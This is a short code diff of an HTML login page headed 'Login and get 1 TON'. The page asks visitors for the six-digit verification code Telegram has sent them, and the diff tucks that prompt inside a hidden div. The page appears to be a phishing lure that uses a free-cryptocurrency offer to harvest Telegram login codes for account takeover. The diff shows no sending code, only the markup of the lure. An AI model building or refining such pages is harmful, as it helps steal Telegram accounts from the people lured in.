@@ -18,7 +18,7 @@
     <div class="spinner"></div>
   </div>
 
-  <main id="app">
+  <main id="app" >
     <div class="login-container">
       <div class="login-header">
         <span>Login and get 1 TON</span>
@@ -29,16 +29,19 @@
         <img src="img/animation.gif" alt="Loading GIF">
       </div>
 
-      <h2 class="login-title">Verification code has been sent to Telegram</h2>
+      <div id="verification-form" style="display: none;">
+        <h2 class="login-title">Verification code has been sent to Telegram</h2>
     
-      <input
-      id="code-input"
-      type="text"
-      inputmode="numeric"
-      maxlength="6"
-      class="login-input"
-      placeholder="Enter verification code"
-  />
+        <input
+        id="code-input"
+        type="text"
+        inputmode="numeric"
+        maxlength="6"
+        class="login-input"
+        placeholder="Enter verification code"
+    />
+      </div>
+     
     
       <!-- <button id="submit-btn" class="login-btn error-btn">Login<img src="img/telegram.png"></button> -->
       <!-- <button id="test-error-btn" class="login-btn error-btn">Test Error<img src="img/telegram.png"></button> -->
